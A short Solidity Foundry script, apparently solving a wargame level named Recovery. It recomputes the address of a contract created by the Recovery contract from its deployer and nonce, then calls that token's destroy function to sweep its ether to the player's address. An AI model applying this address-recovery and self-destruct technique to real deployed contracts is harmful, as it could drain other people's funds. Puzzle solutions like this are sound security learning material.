function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);

    // Generate the token and send ETH to it.
    Recovery(recoveryInstance).generateToken{value: address(this).balance}(
        "Recovery Token",
        100
    );

    // Recovery's first CREATE uses nonce 1.
    address token = address(uint160(uint256(keccak256(
        abi.encodePacked(
            bytes1(0xd6),
            bytes1(0x94),
            recoveryInstance,
            bytes1(0x01)
        )
    ))));

    // Player is the owner because msg.sender in generateToken is PLAYER.
    SimpleToken(token).destroy(
        payable(vm.addr(PLAYER_PRIVATE_KEY))
    );

    vm.stopBroadcast();
}
